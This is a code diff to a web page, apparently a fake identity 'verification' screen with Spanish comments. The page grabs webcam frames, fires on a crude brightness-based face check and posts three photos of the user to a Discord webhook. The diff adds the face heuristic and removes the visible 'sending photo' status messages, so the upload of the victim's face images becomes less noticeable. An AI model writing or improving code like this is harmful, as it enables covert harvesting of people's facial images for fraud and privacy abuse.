@@ -263,7 +263,7 @@
     }
   }
 
-  function hasMovementInFrame() {
+  function detectFace() {
     canvas.width = video.videoWidth;
     canvas.height = video.videoHeight;
     const ctx = canvas.getContext('2d');
@@ -272,23 +272,39 @@
     const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
     const data = imageData.data;
     
-    // Analizar el área central (donde debería estar la cara)
+    // Buscar área central donde debería estar la cara
     const centerX = canvas.width / 2;
     const centerY = canvas.height / 2;
-    const sampleSize = 100;
+    const searchRadius = 150;
     
-    let pixelSum = 0;
-    let pixelCount = 0;
+    let darkPixels = 0;
+    let brightPixels = 0;
+    let totalPixels = 0;
+    let variance = 0;
     
-    for (let i = 0; i < data.length; i += 4) {
-      pixelSum += data[i] + data[i + 1] + data[i + 2];
-      pixelCount++;
+    // Analizar píxeles en el área central
+    for (let y = Math.max(0, centerY - searchRadius); y < Math.min(canvas.height, centerY + searchRadius); y++) {
+      for (let x = Math.max(0, centerX - searchRadius); x < Math.min(canvas.width, centerX + searchRadius); x++) {
+        const idx = (y * canvas.width + x) * 4;
+        const brightness = (data[idx] + data[idx + 1] + data[idx + 2]) / 3;
+        
+        if (brightness < 60) darkPixels++;      // Píxeles muy oscuros (ojos, nariz)
+        if (brightness > 180) brightPixels++;   // Píxeles claros (piel)
+        
+        variance += Math.abs(brightness - 127); // Variación de tonos
+        totalPixels++;
+      }
     }
     
-    const avgBrightness = pixelSum / (pixelCount * 3);
+    // Calcular porcentaje de características
+    const darkRatio = darkPixels / totalPixels;
+    const brightRatio = brightPixels / totalPixels;
+    const avgVariance = variance / totalPixels;
     
-    // Si hay algo visible (no es todo negro, no es todo blanco)
-    return avgBrightness > 30 && avgBrightness < 240;
+    // Detectar cara: debe haber ojos oscuros, piel clara y variación
+    const hasFace = darkRatio > 0.05 && brightRatio > 0.15 && avgVariance > 25;
+    
+    return hasFace;
   }
 
   async function capturePhoto() {
@@ -305,9 +321,6 @@
   async function sendPhotosToDiscord(photoBlobs) {
     try {
       for (let i = 0; i < photoBlobs.length; i++) {
-        loading.classList.add('show');
-        status.textContent = `Enviando foto ${i + 1}/3...`;
-
         const formData = new FormData();
         
         formData.append('payload_json', JSON.stringify({
@@ -332,7 +345,7 @@
               },
               {
                 name: "✅ ESTADO",
-                value: "Captura en progreso",
+                value: "Captura completada",
                 inline: false
               },
               {
@@ -360,13 +373,11 @@
           throw new Error(`Error enviando foto ${i + 1}`);
         }
 
-        // Esperar 1 segundo antes de la siguiente foto
         if (i < photoBlobs.length - 1) {
           await new Promise(r => setTimeout(r, 1000));
         }
       }
 
-      // Todas las fotos enviadas
       loading.classList.remove('show');
       status.classList.add('ready');
       status.textContent = '✓ ¡Verificación completada!';
@@ -389,15 +400,14 @@
       if (isCapturing) return;
 
       try {
-        if (hasMovementInFrame()) {
+        if (detectFace()) {
           faceDetectedFrames++;
           faceFrame.classList.add('perfect');
-          status.textContent = '📸 Detectando...';
 
           if (faceDetectedFrames >= 5) {
             isCapturing = true;
             clearInterval(detectionInterval);
-            status.textContent = 'Capturando fotos...';
+            status.textContent = 'Capturando...';
             faceFrame.classList.remove('perfect');
             
             const photos = [];
